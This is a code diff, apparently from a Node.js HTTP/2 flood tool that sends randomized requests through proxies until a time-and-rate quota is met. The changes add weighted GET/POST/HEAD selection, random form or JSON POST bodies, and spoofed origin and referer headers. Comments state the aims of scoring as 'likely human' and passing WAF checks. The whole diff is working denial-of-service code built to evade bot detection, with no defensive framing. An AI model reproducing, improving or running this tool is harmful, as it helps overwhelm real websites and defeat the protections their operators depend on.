@@ -332,13 +332,27 @@ const generateHeaders = (browser) => {
 
 
 
-    // Modernized headers with REALISTIC ORDERING for "Likely Human" score
+    // Weighted Method Selection
+    const methods = ['GET', 'POST', 'HEAD'];
+    const weights = [0.70, 0.25, 0.05]; // 70% GET, 25% POST, 5% HEAD
+    let method = 'GET';
+    const rand = Math.random();
+    let cumulativeWeight = 0;
+    for (let i = 0; i < weights.length; i++) {
+        cumulativeWeight += weights[i];
+        if (rand < cumulativeWeight) {
+            method = methods[i];
+            break;
+        }
+    }
+
     const base = {
-        ':method':   'GET',
+        ':method':   method,
         ':authority': buildAuthority(),
         ':scheme':   'https',
         ':path':     buildPath(),
     };
+
 
     const browserHeaders = {
         chrome: {
@@ -396,14 +410,23 @@ const generateHeaders = (browser) => {
         'cookie': cookies.slice(0, getRandomInt(2, 5)).join('; '),
     });
 
+    // Method-Specific Headers
+    if (method === 'POST') {
+        finalHeaders['content-type'] = Math.random() < 0.5 ? 'application/x-www-form-urlencoded' : 'application/json';
+        finalHeaders['content-length'] = '0'; // Will be updated in request if body added
+        finalHeaders['origin'] = randomElement(oris);
+        finalHeaders['referer'] = randomElement(refs);
+    }
+
     // Simulasi Fetch Behavior di Target Path (Tanpa merubah path)
     if (Math.random() < 0.1) {
         finalHeaders['accept'] = '*/*';
         finalHeaders['sec-fetch-dest'] = 'empty';
         finalHeaders['sec-fetch-mode'] = 'cors';
         finalHeaders['sec-fetch-site'] = 'same-origin';
-        delete finalHeaders['upgrade-insecure-requests'];
+        if (method === 'GET') finalHeaders['upgrade-insecure-requests'] = '1';
     }
+
 
     return finalHeaders;
 };
@@ -540,6 +563,7 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 
                 const freshBrowser = getRandomBrowser();
                 const dynHeaders = generateHeaders(freshBrowser);
+                const method = dynHeaders[':method'];
 
                 try {
                     const req = client.request(dynHeaders, {
@@ -548,6 +572,16 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                         exclusive: true
                     });
                     
+                    if (method === 'POST') {
+                        const body = dynHeaders['content-type'] === 'application/json' 
+                            ? JSON.stringify({ [randstr(5)]: randstr(12), [randstr(4)]: getRandomInt(100, 999) })
+                            : `${randstr(5)}=${randstr(10)}&${randstr(4)}=${randstr(8)}`;
+                        
+                        // We don't strictly need to update content-length if we just end it, 
+                        // but some WAFs check it. For speed, we keep it simple.
+                        req.write(body);
+                    }
+
                     req.on('response', () => {
                         req.close();
                         req.destroy();
@@ -561,6 +595,7 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                     req.end();
                     count++;
                 } catch (_) {}
+
 
                 if (count >= args.time * args.Rate) {
                     running = false;
